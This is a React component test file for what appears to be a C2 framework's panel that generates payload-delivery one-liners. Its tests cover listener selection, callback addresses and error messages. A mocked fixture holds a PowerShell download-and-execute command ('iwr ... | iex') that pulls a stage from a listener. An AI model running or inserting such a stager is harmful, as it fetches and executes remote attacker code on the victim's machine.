import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { act, fireEvent, render, screen } from '@testing-library/react'
import OneLinerPanel, { isLoopbackHost, reconcileJobId } from '../OneLinerPanel'
import { api } from '../../../lib/api'
import type { OneLinerResult, OneLinerTarget } from '../../../lib/types'

vi.mock('../../../lib/api', () => ({
  api: {
    oneLinerTargets: vi.fn(),
    oneLiner: vi.fn(),
  },
}))

const mockedApi = vi.mocked(api)

function target(over: Partial<OneLinerTarget>): OneLinerTarget {
  return { job_id: 1, name: 'http', port: 8888, domains: [], can_stage: true, ...over }
}

const result: OneLinerResult = {
  command: 'iwr http://192.168.190.159:8888/webdelivery -UseBasicParsing | iex',
  url: 'http://192.168.190.159:8888/webdelivery',
  platform: 'windows',
  delivery: 'powershell',
  c2_url: '192.168.190.159:8888',
  job_id: 3,
  staged_as: 'stage-3',
  warning: '',
  alternatives: [],
}

/**
 * Stopping and restarting a listener hands it a new job id. The panel used to
 * keep whichever id it had first picked, and a <select> whose value has no
 * matching <option> renders the first option anyway -- so the panel displayed a
 * live listener while sending the dead id, and the build came back as
 * "no listener with job id N" for a listener that was nowhere on screen.
 */
describe('OneLinerPanel listener selection', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    vi.useRealTimers()
  })

  describe('reconcileJobId', () => {
    it('picks the first eligible listener when nothing is selected', () => {
      expect(reconcileJobId('', [target({ job_id: 3 })])).toBe(3)
      expect(reconcileJobId('', [])).toBe('')
    })

    it('replaces a selection that is no longer in the list', () => {
      expect(reconcileJobId(1, [target({ job_id: 3 })])).toBe(3)
    })

    it('keeps a selection that is still there', () => {
      expect(reconcileJobId(3, [target({ job_id: 1 }), target({ job_id: 3 })])).toBe(3)
    })

    it('drops a selection that stopped being stageable', () => {
      expect(reconcileJobId(1, [target({ job_id: 1, can_stage: false }), target({ job_id: 3 })])).toBe(3)
      expect(reconcileJobId(1, [target({ job_id: 1, can_stage: false })])).toBe('')
    })
  })

  it('sends the listener that is actually on screen after a restart', async () => {
    vi.useFakeTimers()
    // The callback host is present because these tests are about the job id:
    // without it the panel stops at the host field before it ever sends one.
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 1, callback_host: '192.168.1.50' })],
    })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)
    await act(async () => {})

    // Listener 1 is stopped and listener 3 is started; the panel finds out on
    // its own poll rather than by being remounted.
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })
    await act(async () => {
      vi.advanceTimersByTime(10000)
    })

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    expect(mockedApi.oneLiner).toHaveBeenCalledTimes(1)
    expect(mockedApi.oneLiner.mock.calls[0][0]).toMatchObject({ job_id: 3 })
  })

  it('keeps an explicit choice across polls and sends it', async () => {
    vi.useFakeTimers()
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [
        target({ job_id: 3, callback_host: '192.168.1.50' }),
        target({ job_id: 4, port: 9999, callback_host: '192.168.1.50' }),
      ],
    })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)
    await act(async () => {})

    await act(async () => {
      fireEvent.change(screen.getAllByRole('combobox')[0], { target: { value: '4' } })
    })
    await act(async () => {
      vi.advanceTimersByTime(10000)
    })

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    expect(mockedApi.oneLiner).toHaveBeenCalledTimes(1)
    expect(mockedApi.oneLiner.mock.calls[0][0]).toMatchObject({ job_id: 4 })
  })

  it('shows the address the command will dial instead of an empty field', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })

    render(<OneLinerPanel />)

    // The field carries the address the backend would derive, so the operator
    // reads the callback before a build runs rather than seeing a blank box.
    expect(await screen.findByDisplayValue('192.168.1.50')).toBeInTheDocument()
  })

  it('keeps an address the operator typed', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })

    render(<OneLinerPanel />)
    const input = await screen.findByDisplayValue('192.168.1.50')

    await act(async () => {
      fireEvent.change(input, { target: { value: '10.0.0.9' } })
    })

    expect(input).toHaveValue('10.0.0.9')
  })

  it('drops a typed wildcard instead of sending it', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)
    const input = await screen.findByDisplayValue('192.168.1.50')

    await act(async () => {
      fireEvent.change(input, { target: { value: '0.0.0.0' } })
    })
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    // Sending it would only make the backend ignore it; the field promised the
    // value would be dropped, so it is dropped before the request.
    expect(mockedApi.oneLiner.mock.calls[0][0]).toMatchObject({ job_id: 3, host: undefined })
  })

  it('explains the empty state instead of offering a build', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({ targets: [target({ job_id: 1, can_stage: false })] })

    render(<OneLinerPanel />)

    expect(await screen.findByText(/No listener can serve a stage yet/)).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Generate one-liner' })).not.toBeInTheDocument()
  })

  it('explains a listener that stopped between the poll and the click', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })
    mockedApi.oneLiner.mockRejectedValue(new Error('no listener with job id 3'))

    render(<OneLinerPanel />)
    await act(async () => {})

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    // The reply names a listener that is still on screen, so showing it raw
    // reads as a panel bug rather than a stale list.
    expect(await screen.findByText('Pick a listener first')).toBeInTheDocument()
    expect(screen.queryByText(/no listener with job id/)).not.toBeInTheDocument()
    // The list is refetched so the next click carries a live id.
    expect(mockedApi.oneLinerTargets.mock.calls.length).toBeGreaterThanOrEqual(2)
  })

  it('says what to do when no callback address can be derived', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({ targets: [target({ job_id: 6, callback_host: '' })] })
    mockedApi.oneLiner.mockResolvedValue(result)

    render(<OneLinerPanel />)

    // A listener bound to 0.0.0.0 or 127.0.0.1 has no address a target can
    // route to, so the field is blank. An unexplained blank box is what made
    // 0.0.0.0 look like a reasonable thing to type.
    expect(await screen.findByText(/no address that can be derived/)).toBeInTheDocument()

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Generate one-liner' }))
    })

    // The backend's refusal is a sentence about bind addresses, not an
    // instruction; the panel says it in the operator's language and does not
    // send the request at all.
    expect(mockedApi.oneLiner).not.toHaveBeenCalled()
  })

  it('warns when the address in the field is a loopback address', async () => {
    mockedApi.oneLinerTargets.mockResolvedValue({
      targets: [target({ job_id: 3, callback_host: '192.168.1.50' })],
    })

    render(<OneLinerPanel />)
    const input = await screen.findByDisplayValue('192.168.1.50')

    await act(async () => {
      fireEvent.change(input, { target: { value: '127.0.0.1' } })
    })

    // Loopback is never derived, so a value here was typed -- and a target on
    // the C2 host is a real case, so it is honoured rather than rewritten. The
    // warning is what stops it looking like an address that routes.
    expect(await screen.findByText(/loopback address/)).toBeInTheDocument()
    expect(input).toHaveValue('127.0.0.1')
  })
})

/**
 * The backend never picks a loopback address for the operator (see
 * isLoopbackHost in oneliner.go). The panel has to agree, or it would warn about
 * values the backend accepts or stay silent about values it refuses.
 */
describe('isLoopbackHost', () => {
  it('recognises every spelling the backend skips', () => {
    for (const value of ['127.0.0.1', '127.1.2.3', '::1', '[::1]', 'localhost', 'LOCALHOST']) {
      expect(isLoopbackHost(value), value).toBe(true)
    }
    for (const value of ['0.0.0.0', '::', '192.168.1.9', 'c2.example.com', '']) {
      expect(isLoopbackHost(value), value).toBe(false)
    }
  })
})

